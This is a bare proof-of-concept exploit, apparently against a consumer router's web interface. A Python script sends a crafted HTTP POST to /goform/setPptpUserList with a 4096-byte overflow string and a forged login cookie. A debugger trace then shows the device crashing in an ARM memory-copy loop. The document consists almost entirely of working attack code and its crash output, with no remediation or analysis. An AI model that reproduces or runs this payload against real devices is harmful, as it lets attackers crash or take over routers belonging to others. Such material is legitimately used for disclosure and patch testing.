poc

```
import socket
import os

li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

ip = '192.168.0.119'
port = 80

r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

r.connect((ip, port))

rn = b'\r\n'

p1 = b'a' * 0x1000
p2 = b'list' + p1

p3 = b"POST /goform/setPptpUserList" + b" HTTP/1.1" + rn
p3 += b"Host: 192.168.0.119" + rn
p3 += b"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0" + rn
p3 += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" + rn
p3 += b"Accept-Language: en-US,en;q=0.5" + rn
p3 += b"Accept-Encoding: gzip, deflate" + rn
p3 += b"Cookie: curShow=; ac_login_info=passwork; test=A; password=1111" + rn
p3 += b"Connection: close" + rn
p3 += b"Upgrade-Insecure-Requests: 1" + rn
p3 += (b"Content-Length: %d" % len(p2)) +rn
p3 += b'Content-Type: application/x-www-form-urlencoded'+rn
p3 += rn
p3 += p2

r.send(p3)

response = r.recv(4096)
response = response.decode()
li(response)
```

crash

```
 ► 0xf65d9b00    stm    r0!, {r3, r4, ip, lr} <0xf65b4298>
   0xf65d9b04    ldm    r1!, {r3, r4, ip, lr}
   0xf65d9b08    stm    r0!, {r3, r4, ip, lr}
   0xf65d9b0c    subs   r2, r2, #0x20
   0xf65d9b10    bge    #0xf65d9afc
    ↓
   0xf65d9afc    ldm    r1!, {r3, r4, ip, lr}
 ► 0xf65d9b00    stm    r0!, {r3, r4, ip, lr} <0xf65b4298>
   0xf65d9b04    ldm    r1!, {r3, r4, ip, lr}
   0xf65d9b08    stm    r0!, {r3, r4, ip, lr}
   0xf65d9b0c    subs   r2, r2, #0x20
   0xf65d9b10    bge    #0xf65d9afc

```

